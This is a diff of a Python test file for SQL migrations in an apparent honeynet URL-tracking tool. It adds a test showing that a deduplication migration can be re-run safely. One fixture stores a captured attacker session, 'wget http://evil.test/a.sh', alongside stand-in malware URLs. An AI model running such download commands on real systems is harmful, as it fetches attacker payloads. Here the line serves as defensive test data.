@@ -125,9 +125,9 @@ def test_migrations_keep_existing_rows_and_backfill_history():
     assert conn.execute("SELECT url, src_url FROM discovered_urls").fetchall() == [
         ("http://evil.test/x86", "http://evil.test/a.sh")]
     # 001: every known source becomes an observation, honeynet nodes are recognised,
-    #      every url_session pair becomes an observation with its session
+    #      every url_session pair becomes an observation with its session;
+    # 014: the source-only row of a.sh duplicates its session row and is dropped
     assert set(conn.execute("SELECT url, source, honeynet, session, observed_at FROM observations")) == {
-        ("http://evil.test/a.sh", "CESNET Hugo", "CESNET Hugo", None, "2025-01-01"),
         ("http://evil.test/a.sh", "CESNET Hugo", "CESNET Hugo", "h1", "2025-01-01"),
         ("http://evil.test/x86", "URL content", None, None, "2025-01-02")}
     # 002: the current classification is the first history entry (analyst or 'system')
@@ -236,7 +236,7 @@ def test_migrate_sh_applies_only_a_new_migration_and_refreshes_the_backup(migrat
     assert run().returncode == 0
     (migrations_dir / "999_new.sql").write_text("CREATE TABLE new_feature (id INTEGER);\n", encoding="utf-8")
 
-    result = run()  # 001..013 already applied -> re-running them would fail (ALTER TABLE ADD COLUMN)
+    result = run()  # 001..014 already applied -> re-running them would fail (ALTER TABLE ADD COLUMN)
 
     assert result.returncode == 0, result.stdout + result.stderr
     assert "Applied 999_new.sql" in result.stdout
@@ -257,7 +257,7 @@ def test_migrate_sh_dry_run_blocks_a_failing_migration(migrate_sh):
 
     assert result.returncode != 0
     assert "Dry run failed: 998_broken.sql failed" in result.stdout
-    assert applied_migrations(db_path) == []  # not even the valid 001..013 touched the active DB
+    assert applied_migrations(db_path) == []  # not even the valid 001..014 touched the active DB
     with sqlite3.connect(str(db_path)) as conn:
         assert "content" not in {r[0] for r in conn.execute("SELECT name FROM sqlite_master")}
     assert not (db_path.parent / "backup" / "db_dryrun.sqlite").exists()
@@ -303,3 +303,20 @@ def test_migrate_sh_fails_without_a_database(migrate_sh):
     assert result.returncode != 0
     assert "Database not found" in result.stdout
     assert not db_path.exists()  # no empty DB created by mistake
+
+
+def test_014_keeps_observations_recorded_by_the_collectors():
+    conn = migrate(main_db_with_data())
+    conn.executescript("""
+        INSERT INTO sessions (session_hash, session) VALUES ('h2', 'wget http://evil.test/a.sh');
+        -- a later sighting: a session row and a session-less feed row of another day
+        INSERT INTO observations (url, source, honeynet, session, observed_at)
+            VALUES ('http://evil.test/a.sh', 'Warden', 'CESNET Hugo', 'h2', '2025-03-01T10:00:00Z'),
+                   ('http://evil.test/a.sh', 'HoneyNet.Asia', NULL, NULL, '2025-03-01');
+    """)
+    before = conn.execute("SELECT COUNT(*) FROM observations").fetchone()[0]
+
+    # running it again changes nothing
+    conn.executescript(read(os.path.join(REPO_ROOT, "install", "migrations", "014_observations_backfill_duplicates.sql")))
+
+    assert conn.execute("SELECT COUNT(*) FROM observations").fetchone()[0] == before == 4
